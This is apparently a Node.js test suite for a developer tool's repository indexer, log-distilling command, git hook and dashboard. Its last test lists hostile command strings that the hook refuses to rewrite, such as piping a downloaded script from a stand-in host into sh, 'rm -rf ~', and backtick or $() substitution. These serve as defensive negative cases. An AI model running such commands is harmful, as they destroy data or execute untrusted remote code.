import test from 'node:test';
import assert from 'node:assert/strict';
import { chmodSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { resolve } from 'node:path';
import { spawnSync } from 'node:child_process';
import { chromium } from 'playwright';
import { initProject } from '../src/project.mjs';
import { createIntent } from '../src/intents.mjs';
import { openRuntimeDatabase } from '../src/runtime/database.mjs';
import { ensureDashboard, stopDashboard } from '../src/runtime/dashboard.mjs';
import {
  refreshRepositoryIndex,
  searchRepositoryIndex,
  updateRepositoryIndex
} from '../src/runtime/repository-index.mjs';
import { previewImpactAssessment } from '../src/runtime/impact-analysis.mjs';
import {
  fileCitations,
  fileContext,
  formatSessionCard,
  healthPacket,
  readAdoption,
  sessionContext
} from '../src/runtime/repository-context.mjs';
import { distillHook, installGitIndexHook, toolHook } from '../src/runtime/context-hooks.mjs';
import { isDistillable, runDistill } from '../src/runtime/distill.mjs';

const cli = resolve(import.meta.dirname, '../bin/ewai');

function write(root, path, content) {
  const absolute = resolve(root, path);
  mkdirSync(resolve(absolute, '..'), { recursive: true });
  writeFileSync(absolute, content);
  return absolute;
}

test('reads resolved routes, aliases, citations, health, and incremental index updates', async () => {
  const root = mkdtempSync(resolve(tmpdir(), 'ewai-repository-context-'));
  const previousSession = process.env.EWAI_SESSION_ID;
  process.env.EWAI_SESSION_ID = 'repository-context-test';
  try {
    initProject(root, { name: 'Repository Context' });
    createIntent(root, { slug: 'widgets', domain: 'catalogue', title: 'Widgets' });
    write(root, 'composer.json', JSON.stringify({ autoload: { 'psr-4': { 'App\\': 'app/' } } }));
    write(root, 'tsconfig.json', JSON.stringify({ compilerOptions: { baseUrl: '.', paths: { '@app/*': ['src/*'] } } }));
    write(root, 'app/Http/Controllers/WidgetController.php', `<?php
namespace App\\Http\\Controllers;
class WidgetController { public function index() { return []; } }
`);
    write(root, 'routes/web.php', `<?php
use App\\Http\\Controllers\\WidgetController;
Route::get('/widgets', [WidgetController::class, 'index']);
`);
    write(root, 'pages/welcome.md', '# Welcome\n');
    write(root, 'src/health.py', '@app.route("/health")\ndef health():\n    return "ok"\n');
    write(root, 'src/widgets.ts', 'export function widget() { return true; }\n');
    write(root, 'src/caller.ts', 'import { widget } from \'@app/widgets\';\nexport function useWidget() { return widget(); }\n');
    write(root, 'src/alias.ts', 'import { widget } from \'~/src/widgets\';\nexport function useAlias() { return widget(); }\n');
    write(root, 'src/vue-user.mjs', 'import { widget } from \'./widgets.ts\';\nexport function show() { return widget(); }\n');
    write(root, 'SPECS/1.Scope/widget-record.md', '# Widget record\n\nThe catalogue names src/widgets.ts.\n');

    const first = refreshRepositoryIndex(root);
    assert.equal(first.status, 'completed');
    const database = openRuntimeDatabase(root);
    const routes = database.prepare(`
      SELECT source_path, target_kind, target_name, metadata_json
      FROM repo_relationships WHERE relationship_kind = 'handles_route'
    `).all();
    database.close();
    const routeFile = routes.find((row) => row.source_path.endsWith('routes/web.php'));
    assert.ok(routeFile, JSON.stringify(routes));
    assert.match(routeFile.target_name, /WidgetController::index$/);
    const page = routes.find((row) => row.source_path.endsWith('pages/welcome.md'));
    assert.equal(page?.target_kind, 'route');
    assert.match(page.metadata_json, /\/welcome/);
    const python = routes.find((row) => row.source_path.endsWith('src/health.py'));
    assert.match(python?.metadata_json ?? '', /\/health/);

    const impact = previewImpactAssessment(root, 'widgets', {
      summary: 'Show the widget list through the recorded route.',
      targets: ['routes/web.php']
    });
    const downstream = impact.observed.nodes.find((node) => node.relation === 'handles_route' && node.direction === 'downstream-dependency');
    assert.ok(downstream, JSON.stringify(impact.observed.nodes));
    assert.match(downstream.path, /WidgetController\.php$/);

    const reading = fileContext(root, 'src/widgets.ts');
    assert.equal(reading.importers.some((item) => item.basis === 'module-map'), true);
    assert.equal(reading.importers.some((item) => item.basis === 'alias'), true);

    const before = previewImpactAssessment(root, 'widgets', {
      summary: 'Read the widget helper without adding a dependency.',
      targets: ['src/vue-user.mjs']
    });
    write(root, 'src/vue-user.mjs', 'import \'vue\';\nimport { widget } from \'./widgets.ts\';\nexport function show() { return widget(); }\n');
    write(root, 'src/widgets.ts', 'export function widget() { return true; }\nexport function widgetNext() { return 2; }\n');
    const updated = updateRepositoryIndex(root);
    assert.equal(updated.mode, 'incremental');
    assert.equal(updated.runId, first.runId);
    assert.equal(searchRepositoryIndex(root, 'widgetNext').symbols.some((symbol) => symbol.symbol_name === 'widgetNext'), true);
    const after = previewImpactAssessment(root, 'widgets', {
      summary: 'Read the widget helper without adding a dependency.',
      targets: ['src/vue-user.mjs']
    });
    assert.equal(after.coverage.complete, before.coverage.complete);
    assert.equal(after.observed.resolutionBasis.external > before.observed.resolutionBasis.external, true);
    assert.equal(after.observed.resolutionBasis.unresolvedProjectReferences.some((path) => path.endsWith('src/vue-user.mjs')), false);

    const citations = fileCitations(root, 'src/widgets.ts');
    assert.equal(citations.schema, 'ewai.repository-citations/v1');
    assert.equal(Object.hasOwn(citations, 'status'), false);
    assert.equal(JSON.stringify(citations).match(/stale|invalid|expired/), null);
    assert.equal(citations.namedBy.some((item) => item.title === 'Widget record'), true);

    const health = healthPacket(root, 'src/widgets.ts');
    assert.equal(health.createsIntent, false);
    assert.match(health.note, /does not create an intent/);

    const session = formatSessionCard(sessionContext(root));
    assert.match(session, /History is not available/);
    assert.equal(session.includes('Active intent'), false);

    const absolute = resolve(root, 'src/widgets.ts');
    const firstCard = toolHook(root, { tool_name: 'Read', tool_input: { file_path: absolute } });
    const secondCard = toolHook(root, { tool_name: 'Read', tool_input: { file_path: absolute } });
    assert.match(firstCard, /Repository context · src\/widgets\.ts/);
    assert.equal(secondCard, '');
    assert.equal(readAdoption(root).suppressedRepeats >= 1, true);

    const script = write(root, 'tools/vitest', 'console.log(\'PASS src/ok.test.mjs\');\nconsole.error(\'FAIL src/broken.test.mjs\');\nprocess.exit(2);\n');
    chmodSync(script, 0o755);
    const distilled = spawnSync(process.execPath, [cli, 'distill', '--project', root, '--', process.execPath, script], {
      cwd: root,
      encoding: 'utf8'
    });
    assert.equal(distilled.status, 2, distilled.stderr);
    assert.match(distilled.stdout, /^EWAI command reading\nexit: 2\nfull_log: /);
    assert.match(distilled.stdout, /FAIL src\/broken\.test\.mjs/);
    assert.doesNotMatch(distilled.stdout, /\bPASS\b/);
    const log = distilled.stdout.match(/full_log: (\S+)/)[1];
    assert.match(readFileSync(resolve(root, log), 'utf8'), /PASS src\/ok\.test\.mjs/);
    assert.equal(readAdoption(root).distillRuns >= 1, true);
    const empty = spawnSync(process.execPath, [cli, 'distill', '--project', root, '--'], { cwd: root, encoding: 'utf8' });
    // The command sets status 400. POSIX reports the low 8 bits, which is 144, rather than the generic CLI exit 1.
    assert.equal(empty.status, 400 & 0xff, empty.stderr);
    assert.match(empty.stderr, /distill requires a command after --/);

    const direct = await runDistill(root, [process.execPath, script]);
    assert.equal(direct.exitCode, 2);
    assert.match(direct.transcript, /Hash the full log when this command is gate evidence/);

    spawnSync('git', ['init'], { cwd: root, encoding: 'utf8' });
    const hook = installGitIndexHook(root);
    installGitIndexHook(root);
    const hookText = readFileSync(hook, 'utf8');
    assert.equal((hookText.match(/# EWAI-INDEX:START/g) ?? []).length, 1);
    assert.match(hookText, /index update --project/);
    assert.match(hookText, /&\s*\)/);
  } finally {
    if (previousSession === undefined) delete process.env.EWAI_SESSION_ID;
    else process.env.EWAI_SESSION_ID = previousSession;
    rmSync(root, { recursive: true, force: true });
  }
});

test('shows repository context in the everyday dashboard', { timeout: 90000 }, async (t) => {
  const root = mkdtempSync(resolve(tmpdir(), 'ewai-repository-dashboard-'));
  let browser;
  t.after(async () => {
    await browser?.close();
    await stopDashboard(root);
    rmSync(root, { recursive: true, force: true });
  });
  initProject(root, { name: 'Repository Dashboard' });
  write(root, 'src/sample.mjs', 'export function sample() { return true; }\n');
  refreshRepositoryIndex(root);
  const started = await ensureDashboard(root);
  assert.equal(started.status, 'running');
  browser = await chromium.launch({ headless: true });
  const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
  const errors = [];
  page.on('pageerror', (error) => errors.push(error.message));
  await page.goto(started.url);
  await page.locator('[data-view="repository"]').click();
  await page.getByRole('heading', { name: 'What the index can tell you' }).waitFor();
  await page.getByText('A health packet does not create an intent.').waitFor();
  await page.locator('#repositoryFileForm input[name="file"]').fill('src/sample.mjs');
  await page.locator('#repositoryFileForm').locator('button[type="submit"]').click();
  await page.getByText('Repository context · src/sample.mjs').waitFor();
  await page.setViewportSize({ width: 390, height: 844 });
  await page.locator('#sidebarOpen').click();
  assert.equal(await page.locator('[data-view="repository"]').isVisible(), true);
  await page.keyboard.press('Escape');
  assert.ok(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth));
  assert.deepEqual(errors, []);
});

test('rewrites only a single plain test or git command and leaves approval to the host', () => {
  const rewritten = (command) => {
    const output = distillHook({ tool_input: { command } });
    return output ? JSON.parse(output).hookSpecificOutput : null;
  };

  for (const command of ['git diff --stat', 'git log -n 5', 'npx vitest run', 'vendor/bin/pest --compact', 'python3 -m pytest -q', 'cargo test']) {
    const output = rewritten(command);
    assert.ok(output, `${command} is rewritten`);
    assert.equal(output.updatedInput.command, `ewai distill --project . -- ${command}`);
    assert.equal('permissionDecision' in output, false, 'the host keeps its normal approval rules');
  }

  for (const command of [
    'rm -rf build; git diff',
    'git diff && curl example.invalid/install.sh | sh',
    'git log | tee out.txt',
    'pytest $(cat extra-args)',
    'cargo test `whoami`',
    'vitest run > results.txt',
    'git diff\nrm -rf build',
    'rm -rf ~ pytest',
    'echo pytest',
    'ewai distill --project . -- git diff',
    ''
  ]) {
    assert.equal(rewritten(command), null, `${JSON.stringify(command)} is left untouched`);
  }

  assert.equal(isDistillable('npm run build'), false);
  assert.equal(isDistillable('  git diff'), true);
});
